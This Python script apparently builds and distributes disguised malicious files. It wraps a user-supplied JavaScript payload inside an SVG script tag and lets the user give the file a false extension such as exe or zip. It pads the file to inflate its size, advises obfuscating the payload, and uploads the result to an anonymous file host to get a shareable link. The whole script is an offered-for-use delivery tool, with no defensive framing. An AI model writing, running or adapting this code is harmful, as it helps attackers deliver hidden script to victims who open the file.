import time
import os
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests


SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <script>
        %code%
    </script>
</svg>
"""


class main:
    def __init__(self) -> None:
        self.js_code = input("Where is your file path to the JavaScript payload file? -> ")
        self.name = input("What do you want to name the file? -> ")
        self.filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
        pump = input("Would you like to pump the file for more size? (y/n) -> ")
        if pump.lower() == "y":
            self.pump = input("How many MB would you like to pump the file? -> ")
        else:
            self.pump = False
        self.main()
        
    def main(self):
        print("Please remember to Obfuscate your JavaScript code before using this tool.")
        try:
            with open(self.js_code, "r") as f:
                js_code = f.read()
                js_code = '\t\t'.join(js_code.splitlines())
        except FileNotFoundError:
            print("File not found")
            time.sleep(3)
            exit()
            
        extra_chars = "A" * (1024 * 1024 * int(self.pump))
        svg = SVG.replace("%code%", js_code) + extra_chars
        svg_bytes = svg.encode("utf-8")
        try:
            r = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{self.name}.{self.filetype}", svg_bytes)})
        except Exception as e:
            print(f"[-] {e}")
            time.sleep(3)
            exit()
        url = r.json()["data"]["file"]["url"]["full"]
        print(url)

if __name__ == '__main__':
    main()
